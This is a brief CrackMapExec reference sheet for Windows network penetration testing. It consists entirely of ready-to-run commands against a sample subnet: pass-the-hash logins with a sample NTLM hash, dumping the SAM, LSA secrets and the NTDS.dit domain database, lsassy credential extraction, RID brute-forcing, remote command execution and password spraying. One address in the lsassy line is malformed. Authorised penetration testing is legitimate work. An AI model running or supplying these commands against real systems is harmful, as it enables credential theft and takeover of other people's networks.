# CrackMapExec Reference Guide

This document contains various CrackMapExec (CME) commands for use during
Windows network penetration testing.

---

## Authentication Methods

```bash
# Password authentication
cme smb 192.168.0.48/28 -u 'userb' -p 'Password1234!'

# Pass-the-Hash (NTLM hash) authentication
cme smb 192.168.0.48/28 -u 'userb' -H '29AB86C5C4D2AAB957763E5C1720486D'
```

---

## Enumeration Commands

```bash
# List available shares
cme smb 192.168.0.48/28 -u 'userb' -H '29AB86C5C4D2AAB957763E5C1720486D' --shares

# Dump the SAM database (local accounts)
cme smb 192.168.0.48/28 -u 'userb' -H '29AB86C5C4D2AAB957763E5C1720486D' --local-auth --sam

# Dump LSA secrets
cme smb 192.168.0.48/28 -u 'userb' -H '29AB86C5C4D2AAB957763E5C1720486D' --lsa
```

---

## Module Usage

```bash
# List available modules
cme smb -L

# Use a specific module (e.g., lsassy for credential extraction)
cme smb 192.0.48/28 -u 'user' -p 'password' -M lsassy
```

---

## Additional Techniques

```bash
# Domain user enumeration via RID bruteforcing
cme smb 192.168.0.48/28 -u 'userb' -p 'Password1234!' --rid-brute

# Dump NTDS.dit (Domain Controller database)
cme smb 192.168.0.48/28 -u 'Administrator' -p 'Password1234!' --ntds

# Execute commands on remote system
cme smb 192.168.0.48/28 -u 'Administrator' -p 'Password1234!' -x 'whoami /all'

# Password spraying across multiple hosts
cme smb 192.168.0.48/28 -u users.txt -p passwords.txt
```
